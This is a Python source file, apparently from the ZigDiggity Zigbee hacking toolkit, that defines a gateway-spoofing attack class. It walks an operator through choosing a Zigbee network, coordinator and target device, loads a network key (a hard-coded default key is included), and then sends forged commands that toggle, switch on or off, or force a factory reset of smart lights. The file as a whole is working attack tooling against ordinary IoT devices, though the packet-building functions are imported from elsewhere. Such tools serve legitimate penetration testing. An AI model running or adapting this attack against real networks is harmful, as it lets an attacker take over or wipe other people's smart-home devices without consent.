#!/usr/bin/env python
import struct

from scapy.layers.dot15d4 import *
from scapy.layers.zigbee import *

from PyInquirer import prompt
from zigdiggity.interface.console import print_error
from zigdiggity.misc.actions import light_off, light_on, light_toggle, leave_req, factory_reset
from zigdiggity.misc.utils import NumberValidator

from tools.find_locks import LightFinder


class SpoofAttack():
    def __init__(self, radio):
        self.radio = radio
        self.light_finder = LightFinder(radio)

    def do_automated_prepare(self, channel):
        result = self.light_finder.findLights(channel)
        # print (len(result))
        questions = [
            {
                'type': 'list',
                'name': 'network',
                'message': 'Choose network to attack',
                'choices': ['0x{0:0{1}X}'.format(x, 4) for x in result.keys()],
                'filter': lambda val: int(val, 16),
                'when': len(result) > 1
            },
            {
                'type': 'list',
                'name': 'coordinator',
                'message': 'Choose network coordinator (if discovered wrong)',
                'choices': lambda ans: ['0x{0:0{1}X}'.format(x, 4) for x in result[ans['network']]['devices']],
                'default': lambda ans: '0x{0:0{1}X}'.format(result[ans['network']]['coordinator'], 4),
                'filter': lambda val: int(val, 16)
            },
            {
                'type': 'list',
                'name': 'target',
                'message': 'Choose device to attack',
                'choices': lambda ans: ['0x{0:0{1}X}'.format(x, 4) for x in result[ans['network']]['devices']],
                'filter': lambda val: int(val, 16)
            },
            {
                'type': 'input',
                'name': 'nwk',
                'message': 'Enter the network key (discovered from main option 2)',
                'default': '2f:e6:44:cb:5a:00:84:6a:3a:11:bd:08:d4:16:cc:49',
                'filter': lambda s: int(s.replace(':', ''), 16)
            }
        ]

        return prompt(questions)

    def do_manual_prepare(self):
        questions = [
            {
                'type': 'input',
                'name': 'network',
                'message': 'Choose network to attack',
                'default': '0x',
                'filter': lambda val: int(val, 16)
            },
            {
                'type': 'input',
                'name': 'coordinator',
                'message': 'Choose network coordinator',
                'default': '0x',
                'filter': lambda val: int(val, 16)
            },
            {
                'type': 'input',
                'name': 'target',
                'message': 'Choose device to attack',
                'default': '0x',
                'filter': lambda val: int(val, 16)
            },
            {
                'type': 'input',
                'name': 'nwk',
                'message': 'Enter the network key (discovered from main option 2)',
                'default': '2f:e6:44:cb:5a:00:84:6a:3a:11:bd:08:d4:16:cc:49',
                'filter': lambda s: int(s.replace(':', ''), 16)
            }
        ]

        return prompt(questions)

    def prepare_attack(self, channel, automated):
        answers = None
        if automated:
            answers = self.do_automated_prepare(channel)
        else:
            answers = self.do_manual_prepare()

        if 'network' in answers and 'target' in answers and 'nwk' in answers:
            panid = answers['network']
            target_addr = answers['target']
            coord_addr = answers['coordinator']
            nwk = answers['nwk']
            nwk_key = struct.pack(">QQ", nwk >> 64, nwk % (2**64))
            return (panid, target_addr, coord_addr, nwk_key)
        else:
            print_error(
                "Could not perform attack, not all data was present")
            return (None, None, None, None)

    def do_toggle_attack(self, channel, automated, amount):
        (panid, target_addr, coord_addr, nwk_key) = self.prepare_attack(
            channel, automated)
        light_toggle(self.radio, panid, target_addr,
                     nwk_key, amount, coord_addr)

    def do_on_attack(self, channel, automated, amount):
        (panid, target_addr, coord_addr, nwk_key) = self.prepare_attack(
            channel, automated)
        light_on(self.radio, panid, target_addr, nwk_key, amount, coord_addr)

    def do_off_attack(self, channel, automated, amount):
        (panid, target_addr, coord_addr, nwk_key) = self.prepare_attack(
            channel, automated)
        light_off(self.radio, panid, target_addr, nwk_key, amount, coord_addr)

    def do_factory_attack(self, channel, automated):
        (panid, target_addr, coord_addr, nwk_key) = self.prepare_attack(
            channel, automated)
        leave_req(self.radio, panid, target_addr, nwk_key, coord_addr)
        factory_reset(self.radio, panid, target_addr, nwk_key, coord_addr)

    def doGWSpoofAttack(self):
        questions = [
            {
                'type': 'list',
                'name': 'attack',
                'message': 'What attack would you like to do?',
                'choices': [
                    '1. Toggle',
                    '2. Turn on',
                    '3. Turn off',
                    '4. Force factory reset'
                ],
            },
            {
                'type': 'input',
                'name': 'channel',
                'message': 'Which channel would you like to use?',
                'default': '20',
                'validate': NumberValidator,
                'filter': lambda val: int(val)
            },
            {
                'type': 'confirm',
                'name': 'manual',
                'message': 'Do you want to enter the attack parameters manually?',
                'default': False
            },
            {
                'type': 'input',
                'name': 'amount',
                'message': 'How often do you want to send the attack?',
                'default': '1',
                'validate': NumberValidator,
                'filter': lambda val: int(val)
            }
        ]

        answers = prompt(questions)
        if "channel" not in answers and "manual" not in answers and "amount" not in answers:
            print_error("Sorry, something went wrong with your input!")
            return False

        if answers["attack"] == "1. Toggle":
            self.do_toggle_attack(
                answers["channel"], not answers["manual"], answers["amount"])
        elif answers["attack"] == "2. Turn on":
            self.do_on_attack(answers["channel"],
                              not answers["manual"], answers["amount"])
        elif answers["attack"] == "3. Turn off":
            self.do_off_attack(
                answers["channel"], not answers["manual"], answers["amount"])
        elif answers["attack"] == "4. Force factory reset":
            self.do_factory_attack(answers["channel"], not answers["manual"])
